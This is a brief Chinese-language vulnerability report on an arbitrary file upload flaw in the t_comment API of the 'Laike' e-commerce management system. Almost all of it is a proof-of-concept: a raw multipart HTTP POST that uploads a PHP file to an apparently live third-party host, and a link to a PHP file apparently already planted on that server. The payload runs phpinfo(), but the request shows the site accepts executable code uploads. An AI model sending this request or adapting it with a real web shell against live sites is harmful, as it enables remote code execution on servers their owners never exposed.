# 来客电商管理系统 t_comment 存在文件上传漏洞

    ## poc

https://ztfxcx.ztf520.com/LKT/images/1692345411200.php

```
POST /LKT/index.php?module=api&action=product&m=t_comment HTTP/1.1 
User-Agent: Opera/8.55.(Windows NT 5.01; ky-KG) Presto/2.9.162 Version/12.00 Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Host: ztfxcx.ztf520.com:443
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymtWcHjwCbo2qE3Zi 
Content-Length: 295

------WebKitFormBoundarymtWcHjwCbo2qE3Zi
Content-Disposition: form-data; name="imgFile";filename="0Ujz2.php" 
Content-Type:image/php

<?php phpinfo();
------WebKitFormBoundarymtWcHjwCbo2qE3Zi
Content-Disposition: form-data; name="type";

file 
------WebKitFormBoundarymtWcHjwCbo2qE3Zi--
```
